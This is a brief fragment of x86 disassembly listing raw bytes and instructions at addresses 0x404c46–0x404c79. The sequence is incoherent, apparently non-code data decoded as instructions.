  404c46:	e7 9b                	out    %eax,$0x9b
  404c48:	92                   	xchg   %eax,%edx
  404c49:	53                   	push   %ebx
  404c4a:	8a e7                	mov    %bh,%ah
  404c4c:	f8                   	clc
  404c4d:	37                   	aaa
  404c4e:	d1 40 a7             	roll   $1,-0x59(%eax)
  404c51:	9d                   	popf
  404c52:	2e 24 b9             	cs and $0xb9,%al
  404c55:	1c 1a                	sbb    $0x1a,%al
  404c57:	66 bf c6 02          	mov    $0x2c6,%di
  404c5b:	73 64                	jae    0x404cc1
  404c5d:	fc                   	cld
  404c5e:	55                   	push   %ebp
  404c5f:	ab                   	stos   %eax,%es:(%edi)
  404c60:	53                   	push   %ebx
  404c61:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404c62:	e1 16                	loope  0x404c7a
  404c64:	49                   	dec    %ecx
  404c65:	bb a7 06 79 ee       	mov    $0xee7906a7,%ebx
  404c6a:	39 a0 89 5b d2 ca    	cmp    %esp,-0x352da477(%eax)
  404c70:	dc 85 d8 bd d0 4b    	faddl  0x4bd0bdd8(%ebp)
  404c76:	50                   	push   %eax
  404c77:	36 94                	ss xchg %eax,%esp
  404c79:	e8 6c 52 f6 61       	call   0x62369eea
